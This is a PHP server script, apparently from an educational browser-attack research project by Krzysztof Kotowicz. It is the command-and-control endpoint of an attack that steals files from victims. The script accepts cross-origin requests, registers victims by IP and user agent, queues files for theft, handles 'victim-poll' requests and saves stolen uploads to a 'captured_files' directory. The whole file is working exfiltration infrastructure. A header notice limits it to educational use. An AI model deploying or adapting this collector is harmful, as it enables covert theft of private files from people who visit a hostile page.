<?php
require_once 'Upload_Client.php';
/**
 * Store tracking log
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 * @see http://blog.kotowicz.net
 *
 * THIS FILE IS PART OF THE PROJECT FOR EDUCATIONAL USE *ONLY*
 * ANY COMMERCIAL USE, E.G. FOR VULNERABILITY ASSESSMENT,
 * PENETRATION TESTING IS PROHIBITED - CONTACT THE AUTHOR FOR PERMISSION
 *
 * PERFORMING ACTUAL ATTACKS ON WEBSITES NOT OWNED BY YOU
 * USING THIS PROJECT IS PROHIBITED!
 */

// i'm CORS capable
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Max-Age: 999999");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    // preflight, skip
    die();
}
// init
$db = new PDO('sqlite:' . dirname(__FILE__) . DIRECTORY_SEPARATOR . 'clients.sqlite');
$client = new Upload_Client($db);

$file_storage = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'captured_files';
$response = new stdClass;

if (!empty($_POST)) {
    unset($_POST['_']);

    if (empty($_POST['client'])) {
        // create client id and store in db
	    $_POST['client'] = $client->create($_SERVER['HTTP_USER_AGENT'], $_SERVER['REMOTE_ADDR']);
    }

	$_POST['client'] = $id = (string) $_POST['client'];

	// get client data from db into json
	$client->load($id);

    switch ($_POST['msg']) { // process messages
        case 'get-clients':
            $response->clients = $client->getClients($_SERVER['REMOTE_ADDR']);
            break;
        case 'get-files':
            $response->files = $client->getFiles();
            $response->client_data = $client->getClient($id, $_SERVER['REMOTE_ADDR']);  
            break;
    	case 'set-files':
    		$response->client = $id;
    		$client->setFiles($_POST['files']);
    		break;
    	case 'request-file':
    		$client->requestFileForUpload($_POST['file']);
    		break;
    	case 'will-send-file':
    		$client->MarkFileAsInProgress($_POST['file']);
            break;
    	case 'upload-file':
            if (!empty($_FILES['contents']) && array_key_exists('fileid', $_POST) && $client->hasFile($_POST['fileid'])) {  // process file upload
                $uniq = "file-" . md5(mt_rand() . uniqid());
                $match = array();
                if (preg_match('#\/(jpe?g|gif|png|pdf)$#i', $_POST['type'], $match)) { // images and pdf are "safe" to serve 
                	$ext = $match[1];
            	} else if (preg_match('#\.([a-z0-9]{1,4})$#i', $_FILES['contents']['name'], $match)) { // cite extenstion for other files
            	    $ext = $match[1] . '.bin';
            	} else {
            		$ext = 'bin';
            	}
            	$filename = $uniq . '.' . $ext;
                if (move_uploaded_file($_FILES['contents']['tmp_name'], $file_storage . DIRECTORY_SEPARATOR . $filename)) {
                    $client->markUploadedFile($_POST['fileid'], $filename);
                } else {
                    $client->markErrorInFile($_POST['fileid']);
                }
            }
    	    break;
    	case 'victim-poll':
            $response->requested = $client->getRequestedFiles();
            $client->ping();
    	    break;
	}

	// persist client data
    $client->store();
}


// respond
header("Content-Type: application/json");
echo json_encode($response);
